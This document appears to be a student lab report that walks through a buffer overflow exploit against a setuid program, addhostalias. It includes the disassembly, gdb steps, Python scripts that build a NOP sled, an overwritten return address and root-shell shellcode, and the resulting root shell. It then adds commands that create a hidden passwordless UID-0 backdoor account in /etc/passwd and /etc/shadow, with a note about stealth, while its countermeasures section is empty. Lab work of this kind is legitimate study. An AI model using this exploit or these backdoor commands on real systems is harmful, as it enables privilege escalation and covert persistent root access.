---
typora-root-url: ./report_img
typora-copy-images-to: ./report_img
---

# Report

## Exploit Progress

### 1. Dissemble

```assembly
0x8048540 <add_alias>:	push   %ebp
0x8048541 <add_alias+1>:	mov    %esp,%ebp
0x8048543 <add_alias+3>:	sub    $0x118,%esp
0x8048549 <add_alias+9>:	add    $0xfffffff4,%esp
0x804854c <add_alias+12>:	mov    0x10(%ebp),%eax
0x804854f <add_alias+15>:	push   %eax
0x8048550 <add_alias+16>:	mov    0xc(%ebp),%eax
0x8048553 <add_alias+19>:	push   %eax
0x8048554 <add_alias+20>:	mov    0x8(%ebp),%eax
0x8048557 <add_alias+23>:	push   %eax
0x8048558 <add_alias+24>:	push   $0x80486e0
0x804855d <add_alias+29>:	lea    0xffffff00(%ebp),%eax
0x8048563 <add_alias+35>:	push   %eax
0x8048564 <add_alias+36>:	call   0x8048450 <sprintf>
0x8048569 <add_alias+41>:	add    $0x20,%esp
...
0x8048600 <add_alias+192>:	leave  
0x8048601 <add_alias+193>:	ret    
0x8048602 <add_alias+194>:	mov    %esi,%esi
```

Looking at the assembly instruction `lea 0xffffff00(%ebp),%eax`  we can determine the `formatbuffer` begins at `%ebp - 0x100` (256 bytes below the base pointer).

<img src="/n5opf8v7t1m9ld2q06.svg" alt="n5opf8v7t1m9ld2q06" />

### 2. Run with padding

Add break at `0x8048563` and `0x8048569` then `define hook-stop`  to observe the formarbuffer.

```shell
(gdb) define hook-stop
Type commands for definition of "hook-stop".
End with a line saying just "end".
>x/i $eip
>x/66wx $ebp-256
>end
```

Use padding to find the offset to allow us to control the instruction.

```shell
run $(python -c 'print "A"*256') BB CC
```

| break *0x08048563                                        | break * 0x08048569                                       |
| -------------------------------------------------------- | -------------------------------------------------------- |
| ![image-20250417153324946](/image-20250417153324946.png) | ![image-20250417153356662](/image-20250417153356662.png) |
| ![image-20250417162655885](/image-20250417162655885.png) | ![image-20250417162729710](/image-20250417162729710.png) |

We can see that the saved ebp has been overwritten by "\tBB\t" and save eip has been overwritten by "CC\n". This matches  the stack addresses we had drawn up, confirming that the buffer overflow worked as expected.

Note that gdb can only debug a setuid or setgid program if the debugger is running as root. So when continue in gdb we would see fopen error. Instead, use inspection commands to determine whether the overflow succeeded in following steps.

<img src="/image-20250417154113983.png" alt="image-20250417154113983" style="zoom:50%;" />

### 3. Build Shellcode

#### 3.1 Test the address

Once we have the target address, we can pad the buffer with the shellcode and NOP sled. We need to overwrite the saved return‐address with an address pointing somewhere into the NOP sled. To verify that control flow actually lands in our sled, we choose `int3` firstly. If the output is trap we know our overwrite and landing point are correct.

Attack string example could be:

`([NOP sled] + [Shellcode] + [Padding]) + [Return Address] = 256 + 4 = 260 bytes`

```python
import struct
arg1 = "\x90" * 3 
arg2 = "\x90" * 3
nop_sled = "\x90" * 100
# point to nop
eip = struct.pack("<I", 0xbffffa8c)
shellcode = "\xCC" * 4
# buffer + address - arg1\t - arg2\t - INT3
padding = "\x90" * (260 - 4 - 4 - 100 - len(shellcode)) 
arg3 = nop_sled + padding + eip
print arg1
print arg2
print arg3
```

<img src="/image-20250417201711159.png" alt="image-20250417201711159" style="zoom:50%;" />

#### 3.2 Key shellcode

```c
static char shellcode[] =
 "\xb9\xff\xff\xff\xff"
 "\x31\xc0" //sets real user id from effective user id.
 "\xb0\x31"
 "\xcd\x80"


 "\x89\xc3" // copy the value to ebx
 "\x31\xc0"
 "\xb0\x46"
 "\xcd\x80"

 "\x31\xc0"
 "\xb0\x32"
 "\xcd\x80"


 "\x89\xc3"
 "\xb0\x31"
 "\xb0\x47"  //sets real group id from effective user id.
 "\xcd\x80"

 "\x31\xc0"
 "\x31\xd2"
 "\x52"
 "\x68\x2f\x2f\x73\x68"
 "\x68\x2f\x62\x69\x6e"
 "\x89\xe3"
 "\x52"
 "\x53"
 "\x89\xe1"
 "\xb0\x0b"
 "\xcd\x80"
 "\x31\xc0"
 "\x40"
 "\xcd\x80"

 "\x90\x90\x90\x90"
 "\x90\x90\x90\x90"
 "\x90\x90\x90\x90";
```

TODO:The shellcode is doing a couple of important instructions (see the explanation of the shellcode below) before starting the shell. What is the shellcode exploiting with how addhostalias is configured, why does it execute these instructions, and what would happen if those instructions were not executed? See the “important instructions” below to spot the important parts of the shellcode.

When a SUID program runs, it executes with the real UID of the invoking user but the effective UID of the file owner (likely root). Modern Unix shells have a security feature that drops privileges by resetting the effective UID to match the real UID when they detect they're being run from a SUID context.

By calling `setreuid` and `setregid`, the shellcode permanently sets both the real and effective user/group IDs to root before spawning `/bin/sh`. This prevents the shell from dropping privileges.

If these instructions were omitted:

- The spawned shell would detect the SUID environment
- It would drop privileges by setting the effective UID to match the real UID
- The attacker would end up with a regular user shell instead of a root shell
- The privilege escalation attempt would fail



Having confirmed the trap, we now substitute the `INT3` with the provided shellcode, rebuild the NOP sled accordingly.

```python
import struct
arg1 = "\x90" * 3
arg2 = "\x90" * 3
nop_sled = "\x90" * 100
eip = struct.pack("<I", 0xbffffa8c)
shellcode = ('\xb9\xff\xff\xff\xff\x31\xc0\xb0\x31\xcd\x80'
            +'\x89\xc3\x31\xc0\xb0\x46\xcd\x80\x31\xc0\xb0'
            +'\x32\xcd\x80\x89\xc3\xb0\x31\xb0\x47\xcd\x80'
            +'\x31\xc0\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68'
            +'\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xb0'
            +'\x0b\xcd\x80\x31\xc0\x40\xcd\x80\x90\x90\x90'
            +'\x90\x90\x90\x90\x90\x90\x90\x90\x90')
padding = "\x90" * (260 - 4 -4 - 100 - len(shellcode))
arg3 = nop_sled + shellcode + padding + eip
print arg1
print arg2
print arg3
```

Debugging under GDB, we can see that the saved return address (EIP) has been overwritten with `0xbffffa8c`, exactly the value we injected.

<img src="/image-20250417205038772.png" alt="image-20250417205038772" style="zoom:50%;" />

![s88j4ll240hm9lqni93](/s88j4ll240hm9lqni93.svg)

<img src="/image-20250417211507256.png" alt="image-20250417211507256" style="zoom:50%;" />

Finally, the prompt `sh-2.05a#` confirms that we have successfully exploited the buffer overflow vulnerability, executed our shellcode, and spawned a shell with root privileges.

### 4.Root access

```shell
# First add to /etc/passwd
echo "hiddenuser:x:0:0::/dev/null:/bin/bash" >> /etc/passwd

# Add to /etc/shadow with empty password field
echo "hiddenuser::19000:0:99999:7:::" >> /etc/shadow
```

In root shell, create a hidden user with root privileges (UID 0).

TODO:隐蔽性

<img src="/image-20250417215812484.png" alt="image-20250417215812484" style="zoom:50%;" />



### 5. Countermeasures

#### 5.1 Language Level

#### 5.2 Run-time level

#### 5.3 Operating system Level